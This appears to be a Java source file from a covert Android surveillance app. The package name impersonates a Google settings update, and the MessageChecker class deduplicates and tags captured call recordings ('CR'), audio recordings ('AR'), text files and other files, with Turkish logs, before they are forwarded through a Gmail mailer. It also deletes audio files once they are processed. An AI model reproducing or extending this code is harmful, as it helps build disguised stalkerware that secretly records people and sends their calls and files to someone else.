package com.setting.dl.google.googlesettingupdate.ptt.checkers;

import android.annotation.SuppressLint;
import android.content.Context;

import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;
import java.util.ArrayList;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedDeque;

public class MessageChecker implements IMessageChecker {
   
   private final long                            MESSAGE_DATE_LIMIT;
   private       ConcurrentLinkedDeque<IMessage> oldbox;
   //private final Context                         context;
   private       Save                            save;
   
   public MessageChecker(Context context) {
      
      //this.context = context;
      save = new Save(context, "MessageChecker");
      getOldbox();
      
      MESSAGE_DATE_LIMIT = save.getLong("MESSAGE_DATE_LIMIT", 180000L);
      
      u.log.d("Mesaj zaman limiti [%d ms] olarak ayarlandı.", MESSAGE_DATE_LIMIT);
   }
   
   @Override
   public boolean checkMessage(IMessage message) {
      
      switch (message.getMessageType()) {
         
         case TEXT_FILE: return checkTextFileMessage(message);
         case FILE: return checkFileMessage(message);
         case AUDIO: return checkAudioFileMessage(message);
         case TEXT: return checkTextMessage(message);
         case CALL:return checkCallFileMessage(message);
         default: return false;
      }
   }
   
   private boolean checkTextFileMessage(IMessage message) {
      
      setMessageHeader(message);
      File     file = message.getFile();
      IMessage exist;
      
      if ((exist = existFile(file)) != null) {
         
         if (exist.getBody().equals(message.getBody())) {
            
            u.log.d("Bu mesaj daha önce gönderildi : %d", message.hashCode());
            return true;
         }
         
         u.log.d("Mesaj dosyası (%s) aynı ancak içerikler farklı. Gönderilecek", file.getName());
      }
      
      addToOldbox(message);
      
      return false;
   }
   
   private void setMessageHeader(IMessage message) {
      
      message.setBody(Mail.getFileContent(message.getFile()));
      message.setSubject(message.getFile().getName());
   }
   
   private void addToOldbox(IMessage message) {
      
      oldbox.addFirst(message);
      
      if (oldbox.size() > 50) {
         
         oldbox.removeLast();
         
         u.log.d("oldbox 50 sınırını aştı. Sondan bir mesaj silindi");
      }
      
      saveOldbox();
   }
   
   private boolean checkTextMessage(IMessage message) {
   
      for (IMessage _msg : oldbox) {
   
         if (message.getBody().equals(_msg.getBody())) {
   
            if ((message.getDate() - _msg.getDate()) > MESSAGE_DATE_LIMIT) {
   
               u.log.d("Bu mesaj zaten gönderildi : %d. Ancak zaman limiti (%d ms) aşıldığı için tekrar gönderilecek.", message.hashCode(), MESSAGE_DATE_LIMIT);
            }
            else{
               
               u.log.d("Bu mesaj zaten gönderildi : %d", message.hashCode());
               return true;
            }
         }
      }
      
      addToOldbox(message);
      
      return false;
   }
   
   private boolean checkFileMessage(IMessage message) {
      
      File     file = message.getFile();
      IMessage exist;
      
      if ((exist = existFile(file)) != null) {
         
         if ((message.getDate() - exist.getDate()) < MESSAGE_DATE_LIMIT) {
            
            u.log.d("Bu dosya kısa süre önce işlendi : %s", file.getName());
            return true;
         }
         
         u.log.d("Bu dosya (%s) daha önce işlenmesine rağmen zaman limitini aşmış durumda. Bu yüzden gönderilecek.", file.getName());
      }
      
      addToOldbox(message);
      
      return false;
   }
   
   private boolean checkAudioFileMessage(IMessage message) {
      
      File file = message.getFile();
   
      if (file == null) {
         
         u.log.w("Dosya null");
         return true;
      }
      
      if (existFile(file) != null) {
         
         u.log.d("Bu dosya daha önce işlendi . %s", file.getName());
         u.deleteFile(file);
         return true;
      }
      
      if (file.length() < 5000L) {
         
         u.log.d("Dosya boyutu çok küçük : %s [%d kb]", file.getName(), (file.length() / 1024L));
         u.deleteFile(file);
         return true;
      }
      
      setAudioInfo(message);
      
      addToOldbox(message);
      
      return false;
   }
   
   private boolean checkCallFileMessage(IMessage message) {
   
      File file = message.getFile();
   
      if (existFile(file) != null) {
      
         u.log.d("Bu dosya daha önce işlendi . %s", file.getName());
         return true;
      }
      
      setAudioInfo(message);
      message.setSubject("CR");
      
      addToOldbox(message);
      return false;
   }
   
   @SuppressLint("UsableSpace")
   private void setAudioInfo(IMessage message) {
      
      File file = message.getFile();
      
      long duration = u.getDuration(file.getAbsolutePath());
      
      String body = Time.getDate(file.lastModified()) + "\n";
      
      body += String.format(new Locale("tr"), "%-21s : %s\n%-21s : %.2f MB\n%-21s : %s\n%-21s : %.2f MB\n%-21s : %.2f MB\n%-21s : %.2f MB\n",
            
            
            "Dosya ismi", file.getName(),
            "Boyut", (float) file.length() / (1024 * 1024),
            "Süre", duration != -60L ? u.formatMilliSeconds(duration) : "Bilgi alınamadı",
            "Toplam alan", (float) file.getTotalSpace() / (1024 * 1024),
            "Boş alan", (float) file.getFreeSpace() / (1024 * 1024),
            "Kullanılabilir alan", (float) file.getUsableSpace() / (1024 * 1024)
      
      );
   
      if (duration == -60L) {
   
         message.setSubject(file.getName());
      }
      else{
   
         message.setSubject("AR");
      }
      
      message.setBody(body);
   }
   
   private IMessage existFile(File file) {
      
      for (IMessage message : oldbox) {
         
         File _f = message.getFile();
         
         if(_f == null) continue;
         
         if (_f.getName().equals(file.getName())) return message;
      }
      
      return null;
   }
   
   private void getOldbox() {
      
      oldbox = new ConcurrentLinkedDeque<>(save.getObjectsList("oldbox", IMessage.class));
   }
   
   private void saveOldbox() {
      
      save.deleteValue("oldbox");
      save.saveObjectsList("oldbox", new ArrayList<>(oldbox));
      
   }
}
